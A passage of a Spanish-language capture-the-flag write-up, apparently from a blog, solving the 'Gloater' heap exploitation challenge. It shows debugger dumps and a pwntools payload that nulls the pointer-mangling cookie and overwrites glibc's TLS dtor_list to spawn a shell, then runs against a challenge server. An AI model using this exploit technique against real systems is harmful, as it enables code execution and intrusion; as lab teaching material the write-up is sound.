</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">))</span>  
+</code></pre></div><p>Pondremos una dirección de la TLS para realizar el ataque <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">TLS-storage <code>dtor_list</code></a>. El <em>offset</em> de la dirección se puede encontrar en GDB, basado en Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>tls
+$tls = 0x7f443d281540
+<span class="code-dark-cyan">------------------------------------------------------------------------------------ TLS-0x80 ------------------------------------------------------------------------------------</span>  
+<span class="code-dark-cyan">0x7f443d2814c0</span>|+0x0000|+000: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2814c8</span>|+0x0008|+001: <span>0x00007f443d2294c0</span>  -&gt;  0x0000000100000000
+<span class="code-dark-cyan">0x7f443d2814d0</span>|+0x0010|+002: <span>0x00007f443d229ac0</span>  -&gt;  0x0000000100000000
+<span class="code-dark-cyan">0x7f443d2814d8</span>|+0x0018|+003: <span>0x00007f443d22a3c0</span>  -&gt;  0x0002000200020002
+<span class="code-dark-cyan">0x7f443d2814e0</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2814e8</span>|+0x0028|+005: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2814f0</span>|+0x0030|+006: <span class="code-dark-blue">0x000056372a0c0010</span>  -&gt;  0x0000000000020000
+<span class="code-dark-cyan">0x7f443d2814f8</span>|+0x0038|+007: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281500</span>|+0x0040|+008: <span class="code-dark-green">0x00007f443d27ab80</span>  -&gt;  0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281508</span>|+0x0048|+009: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281510</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281518</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281520</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281528</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281530</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281538</span>|+0x0078|+015: 0x0000000000000000
+<span class="code-dark-cyan">-------------------------------------------------------------------------------------- TLS --------------------------------------------------------------------------------------</span>
+<span class="code-dark-cyan">0x7f443d281540</span>|+0x0000|+000: <span class="code-dark-green">0x00007f443d281540</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7f443d281548</span>|+0x0008|+001: <span class="code-dark-green">0x00007f443d281ea0</span>  -&gt;  0x0000000000000001
+<span class="code-dark-cyan">0x7f443d281550</span>|+0x0010|+002: <span class="code-dark-green">0x00007f443d281540</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7f443d281558</span>|+0x0018|+003: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281560</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281568</span>|+0x0028|+005: 0x003fe0e03aa30100<span class="code-blue">  &lt;-  canary</span>
+<span class="code-dark-cyan">0x7f443d281570</span>|+0x0030|+006: 0xe6a7e152dbcd2717<span class="code-blue">  &lt;-  PTR_MANGLE cookie</span>
+<span class="code-dark-cyan">0x7f443d281578</span>|+0x0038|+007: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281580</span>|+0x0040|+008: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281588</span>|+0x0048|+009: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281590</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281598</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815a0</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815a8</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815b0</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815b8</span>|+0x0078|+015: 0x0000000000000000
+<span class="code-green">gef&gt; </span>p/x $tls - $libc
+$3 = 0x1f3540
+</code></pre></div><p>Para que esta técnica funcione, necesitamos establecer un puntero en un <em>chunk</em> que contenga una dirección de función <em>mangled</em> y una lista de argumentos. Entonces, usaremos bytes nulos para sobrescribir <code>PTR_MANGLE cookie</code>, para que la operación <em>mangle</em> sea solo un desplazamiento de bits lógico:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">) </span>
+
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">tls_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">80</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">17</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1f3540</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1f3ea0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1f3540</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">tls_payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span>
+
+<span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk1">tls_payload</span><span class="mtk1">.ljust(</span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span>  
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'6'</span><span class="mtk1">)</span>
+</code></pre></div><p>Para obtener más información sobre esta técnica, se puede leer <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">el repositorio de GitHub de nobodyisnobody</a> o <a href="../htb-unictf/zombiedote">Zombiedote</a>.</p><p>Con esto, utilizamos la primitiva de escritura arbitraria del Tcache <em>poisoning</em> para modificar TLS-storage:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>tls
+$tls = 0x7f443d281540
+<span class="code-dark-cyan">------------------------------------------------------------------------------------ TLS-0x80 ------------------------------------------------------------------------------------</span>  
+<span class="code-dark-cyan">0x7f443d2814c0</span>|+0x0000|+000: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2814c8</span>|+0x0008|+001: <span>0x00007f443d2294c0</span>  -&gt;  0x0000000100000000
+<span class="code-dark-cyan">0x7f443d2814d0</span>|+0x0010|+002: <span>0x00007f443d229ac0</span>  -&gt;  0x0000000100000000
+<span class="code-dark-cyan">0x7f443d2814d8</span>|+0x0018|+003: <span>0x00007f443d22a3c0</span>  -&gt;  0x0002000200020002
+<span class="code-dark-cyan">0x7f443d2814e0</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2814e8</span>|+0x0028|+005: <span class="code-dark-green">0x00007f443d2814f0</span>  -&gt;  0xfe887a1c05200000
+<span class="code-dark-cyan">0x7f443d2814f0</span>|+0x0030|+006: 0xfe887a1c05200000
+<span class="code-dark-cyan">0x7f443d2814f8</span>|+0x0038|+007: <span>0x00007f443d2425bd</span>  -&gt;  0x0068732f6e69622f (<span class="code-dark-yellow">'/bin/sh'</span>?)
+<span class="code-dark-cyan">0x7f443d281500</span>|+0x0040|+008: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281508</span>|+0x0048|+009: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281510</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281518</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281520</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281528</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281530</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281538</span>|+0x0078|+015: 0x0000000000000000
+<span class="code-dark-cyan">-------------------------------------------------------------------------------------- TLS --------------------------------------------------------------------------------------</span>
+<span class="code-dark-cyan">0x7f443d281540</span>|+0x0000|+000: <span class="code-dark-green">0x00007f443d281540</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7f443d281548</span>|+0x0008|+001: <span class="code-dark-green">0x00007f443d281ea0</span>  -&gt;  0x0000000000000001
+<span class="code-dark-cyan">0x7f443d281550</span>|+0x0010|+002: <span class="code-dark-green">0x00007f443d281540</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7f443d281558</span>|+0x0018|+003: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281560</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281568</span>|+0x0028|+005: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281570</span>|+0x0030|+006: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281578</span>|+0x0038|+007: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281580</span>|+0x0040|+008: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281588</span>|+0x0048|+009: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281590</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d281598</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815a0</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815a8</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815b0</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7f443d2815b8</span>|+0x0078|+015: 0x0000000000000000
+</code></pre></div><p>En este punto, podemos usar la opción <code>6</code> para salir del programa, de modo que nuestro <em>payload</em> de TLS-storage <code>dtor_list</code> llama a <code>system("/bin/sh")</code> y conseguimos una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-blue">*</span>] Switching to interactive mode  
+<span class="code-red">$</span> ls
+flag.txt
+gloater
+run.sh
+<span class="code-red">$</span> cat flag.txt
+HTB{f4k3_fL4g_f0R_t3sTiNg}
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Vamos a a probar en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.54.170:58631
+[<span class="code-blue">*</span>] './gloater'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Opening connection to 94.237.54.170 on port 58631: Done  
+[<span class="code-green">+</span>] Glibc base address: 0x7f10e7394000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+flag.txt
+gloater
+run.sh
+<span class="code-red">$</span> cat flag.txt
+HTB{gL0aT_aLl_y0u_l1k3,c0mb4t_cHoOsES_tH3_viCt0rS}
+</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Gloater/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#otras-funciones">Otras funciones</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
